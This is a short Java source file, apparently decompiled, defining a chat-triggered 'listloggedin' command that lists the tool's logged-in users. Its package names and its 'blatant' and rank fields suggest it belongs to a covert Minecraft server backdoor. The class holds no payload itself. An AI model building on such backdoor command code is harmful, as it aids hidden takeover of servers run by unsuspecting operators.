package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "listloggedin",
   description = "Lists the logged in users",
   blatant = false,
   rank = Rank.FREE
)
public class ListLoggedInCommand extends AbstractCommand {
   public ListLoggedInCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      StringBuilder var4 = new StringBuilder();

      for(User var6 : Ectasy.users.values()) {
         if (var6.rank != Rank.UNAUTHORIZED) {
            var4.append(ChatUtil.getColorByPlayer(var6.player)).append(var6.player.getName()).append("\n");
         }
      }

      for(String var8 : var4.toString().split("\n")) {
         ChatUtil.sendChat(var1.getPlayer(), var8);
      }
   }
}
